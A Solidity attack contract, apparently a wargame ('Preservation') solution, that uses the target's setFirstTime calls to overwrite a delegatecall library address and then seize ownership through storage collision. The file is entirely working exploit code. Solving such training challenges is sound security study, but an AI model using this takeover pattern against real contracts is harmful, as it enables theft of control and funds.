// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPreservation {
    function setFirstTime(uint256 _timeStamp) external;
}


contract PreservationAttack {
    address private target;
    address public my_address = address(this);
    address public owner = 0x492E904fC65B8570829d0F6162d5441bA06Ffd48;

    constructor (address _target) {
        target = _target;
    }

    function attack() external {
        IPreservation(target).setFirstTime(uint160(my_address));
        IPreservation(target).setFirstTime(uint160(owner));
    }

    function setTime(uint256 _owner) public {
        owner = address(uint160(_owner));
    }

}
